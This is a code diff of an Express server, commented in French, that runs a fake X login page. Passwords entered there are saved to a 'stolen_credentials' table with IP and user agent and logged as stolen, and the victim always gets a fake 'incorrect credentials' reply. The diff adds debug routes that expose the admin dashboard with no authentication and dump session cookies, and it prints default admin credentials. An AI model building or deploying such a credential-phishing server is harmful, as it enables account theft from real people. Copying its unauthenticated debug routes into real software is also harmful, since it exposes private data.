@@ -14,17 +14,21 @@ const db = createClient({
 
 // --- INITIALISATION DE LA BDD ---
 async function initDb() {
-    await db.execute(`
-        CREATE TABLE IF NOT EXISTS stolen_credentials (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT NOT NULL,
-            password TEXT NOT NULL,
-            ip TEXT,
-            user_agent TEXT,
-            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-        )
-    `);
-    console.log('✅ Base de données initialisée');
+    try {
+        await db.execute(`
+            CREATE TABLE IF NOT EXISTS stolen_credentials (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                username TEXT NOT NULL,
+                password TEXT NOT NULL,
+                ip TEXT,
+                user_agent TEXT,
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+        console.log('✅ Base de données initialisée');
+    } catch (error) {
+        console.error('❌ Erreur BDD:', error);
+    }
 }
 initDb().catch(console.error);
 
@@ -33,14 +37,15 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// Sessions pour l'admin
+// --- SESSIONS (configuration adaptée pour Render) ---
 app.use(session({
     secret: process.env.SESSION_SECRET || 'x-honeypot-secret-key-change-me',
     resave: false,
     saveUninitialized: false,
     cookie: { 
-        secure: process.env.NODE_ENV === 'production',
-        maxAge: 24 * 60 * 60 * 1000 // 24h
+        secure: process.env.NODE_ENV === 'production', // true sur Render
+        maxAge: 24 * 60 * 60 * 1000, // 24h
+        sameSite: 'lax'
     }
 }));
 
@@ -64,6 +69,20 @@ app.get('/admin/dashboard', (req, res) => {
     res.sendFile(path.join(__dirname, 'private', 'dashboard.html'));
 });
 
+// --- ROUTES DE DEBUG (pour tester sans auth) ---
+app.get('/admin/dashboard-direct', (req, res) => {
+    res.sendFile(path.join(__dirname, 'private', 'dashboard.html'));
+});
+
+app.get('/api/test-session', (req, res) => {
+    res.json({
+        sessionID: req.sessionID,
+        user: req.session.user || 'pas de session',
+        cookies: req.headers.cookie || 'pas de cookies',
+        env: process.env.NODE_ENV || 'non défini'
+    });
+});
+
 // --- API ROUTES ---
 
 // 4. Enregistrer les identifiants volés (route publique)
@@ -75,7 +94,6 @@ app.post('/api/login', async (req, res) => {
     }
 
     try {
-        // Enregistrer dans la BDD
         await db.execute({
             sql: 'INSERT INTO stolen_credentials (username, password, ip, user_agent) VALUES (?, ?, ?, ?)',
             args: [
@@ -88,7 +106,6 @@ app.post('/api/login', async (req, res) => {
 
         console.log(`🔴 IDENTIFIANTS VOLÉS : ${username} / ${password}`);
 
-        // Toujours répondre "échec" pour faire croire que c'est une vraie page X
         res.status(401).json({ 
             error: 'Identifiants incorrects. Veuillez réessayer.' 
         });
@@ -141,8 +158,10 @@ app.post('/api/admin-login', (req, res) => {
 
     if (username === adminUser && password === adminPass) {
         req.session.user = { username };
+        console.log(`✅ Admin connecté : ${username}`);
         res.json({ success: true });
     } else {
+        console.log(`❌ Tentative échouée : ${username} / ${password}`);
         res.status(401).json({ error: 'Identifiants incorrects' });
     }
 });
@@ -158,5 +177,6 @@ app.listen(PORT, () => {
     console.log(`🚀 Serveur lancé sur http://localhost:${PORT}`);
     console.log(`📡 Fausse page X : http://localhost:${PORT}/`);
     console.log(`🔐 Panel admin : http://localhost:${PORT}/admin`);
-    console.log(`👤 Identifiants admin par défaut : admin / changeme`);
+    console.log(`🔑 Identifiants admin par défaut : admin / changeme`);
+    console.log(`🛠️  DEBUG : /admin/dashboard-direct (sans auth)`);
 });
